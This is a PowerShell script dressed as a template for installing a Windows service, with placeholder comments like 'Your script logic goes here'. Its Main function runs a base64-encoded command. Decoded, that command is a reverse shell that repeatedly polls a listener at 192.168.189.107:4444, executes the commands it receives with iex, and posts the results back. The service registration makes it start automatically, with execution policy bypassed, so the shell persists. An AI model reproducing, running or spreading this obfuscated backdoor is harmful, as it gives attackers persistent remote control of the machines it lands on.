$serviceName = "MyService"
$scriptPath = "C:\Path\to\your\script.ps1"

function Main {
    # Your script logic goes here
    powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQA4ADkALgAxADAANwA6ADQANAA0ADQAJwA7ACQAaQA9ACcANgA3AGMAMQA3ADcAMABmAC0ANABiADkANgBjAGMAZgA0AC0ANwBlAGQAMwAxADYAMwAxACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADYANwBjADEANwA3ADAAZgAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQA4ADgANQA0AC0AZQA4ADAAZgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA0AGIAOQA2AGMAYwBmADQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AOAA4ADUANAAtAGUAOAAwAGYAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8ANwBlAGQAMwAxADYAMwAxACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AOAA4ADUANAAtAGUAOAAwAGYAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==

}

function Register-Service {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ServiceName,

        [Parameter(Mandatory = $true)]
        [string]$ScriptPath
    )

    $serviceName = $ServiceName
    $scriptPath = $ScriptPath

    $serviceExists = Get-Service $serviceName -ErrorAction SilentlyContinue

    if ($serviceExists) {
        Write-Host "Service '$serviceName' already exists. Uninstalling..."
        Uninstall-Service -ServiceName $serviceName
    }

    Write-Host "Installing service '$serviceName'..."

    $null = New-Service -Name $serviceName -BinaryPathName "powershell.exe -NoProfile -ExecutionPolicy Bypass -File $scriptPath" -StartupType Automatic

    Write-Host "Service '$serviceName' installed."
}

function Uninstall-Service {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ServiceName
    )

    $serviceName = $ServiceName

    $serviceExists = Get-Service $serviceName -ErrorAction SilentlyContinue

    if ($serviceExists) {
        Write-Host "Stopping service '$serviceName'..."
        Stop-Service -Name $serviceName

        Write-Host "Uninstalling service '$serviceName'..."
        $null = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'" | ForEach-Object { $_.Delete() }

        Write-Host "Service '$serviceName' uninstalled."
    } else {
        Write-Host "Service '$serviceName' does not exist."
    }
}

Register-Service -ServiceName $serviceName -ScriptPath $scriptPath

# The script logic continues here

Main
